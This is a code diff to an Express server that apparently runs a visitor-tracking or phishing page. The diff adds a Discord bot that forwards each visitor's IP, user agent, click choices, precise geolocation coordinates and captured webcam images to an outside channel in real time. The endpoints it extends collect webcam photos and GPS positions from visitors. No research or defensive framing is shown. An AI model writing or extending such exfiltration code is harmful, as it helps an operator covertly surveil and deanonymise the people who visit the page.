@@ -1,6 +1,8 @@
+require('dotenv').config();
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
+const { Client, GatewayIntentBits, AttachmentBuilder } = require('discord.js');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -23,6 +25,33 @@ function parseBody(req) {
     try { return JSON.parse(req.body); } catch(e) { return {}; }
   }
   return req.body;
+}
+
+// ========== DISCORD BOT INTEGRATION ==========
+const discordClient = new Client({ intents: [GatewayIntentBits.Guilds] });
+const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
+const DISCORD_CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
+
+if (DISCORD_BOT_TOKEN) {
+  discordClient.login(DISCORD_BOT_TOKEN).catch(e => console.error('[!] Discord login failed:', e.message));
+  discordClient.once('ready', () => {
+    console.log(`[+] Discord Bot logged in as ${discordClient.user.tag}`);
+    sendToDiscord({ content: `🟢 **Server Started & Bot Connected!**\nListening for new visitors...` });
+  });
+} else {
+  console.log('[-] DISCORD_BOT_TOKEN not found in .env. Discord notifications disabled.');
+}
+
+async function sendToDiscord(options) {
+  if (!discordClient.isReady() || !DISCORD_CHANNEL_ID) return;
+  try {
+    const channel = await discordClient.channels.fetch(DISCORD_CHANNEL_ID);
+    if (channel && channel.isTextBased()) {
+      await channel.send(options);
+    }
+  } catch(e) {
+    console.error('[!] Failed to send message to Discord:', e.message);
+  }
 }
 
 // ========== DATA COLLECTION ENDPOINTS ==========
@@ -59,6 +88,20 @@ app.post('/api/collect', (req, res) => {
 
     fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
     console.log(`[+] Data collected from ${entry.ip} (type: ${entry.type}, ID: ${entry.id})`);
+
+    // Discord Notification
+    const msgLines = [
+      `**New Event:** \`${entry.type}\``,
+      `**IP:** ${entry.ip}`,
+      `**Visitor ID:** ${entry.id}`
+    ];
+    if (entry.type === 'click') {
+      msgLines.push(`**Button:** ${entry.buttonText}`, `**Decision:** ${entry.decision}`);
+    } else if (entry.type === 'page_visit') {
+      msgLines.push(`**User-Agent:** \`${entry.userAgent}\``);
+    }
+    sendToDiscord({ content: msgLines.join('\n') });
+
   } catch(e) {
     console.error('[!] Error saving collect data:', e.message);
   }
@@ -97,6 +140,12 @@ app.post('/api/geolocation', (req, res) => {
     }
     
     fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
+    
+    // Discord Notification
+    sendToDiscord({
+      content: `📍 **New Geolocation**\n**Visitor ID:** ${id}\n**Coords:** ${latitude}, ${longitude}\n**Accuracy:** ${accuracy || 'unknown'} meters\n**IP:** ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress}`
+    });
+
   } catch(e) {
     console.error('[!] Error saving geolocation:', e.message);
   }
@@ -133,6 +182,18 @@ app.post('/api/webcam', (req, res) => {
     }
 
     fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
+
+    // Discord Notification
+    if (image.startsWith('data:image')) {
+      const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
+      const buffer = Buffer.from(base64Data, 'base64');
+      const attachment = new AttachmentBuilder(buffer, { name: `webcam-${id}.jpg` });
+      sendToDiscord({
+        content: `📸 **New Webcam Capture**\n**Visitor ID:** ${id}\n**IP:** ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress}`,
+        files: [attachment]
+      });
+    }
+
   } catch(e) {
     console.error('[!] Error saving webcam:', e.message);
   }
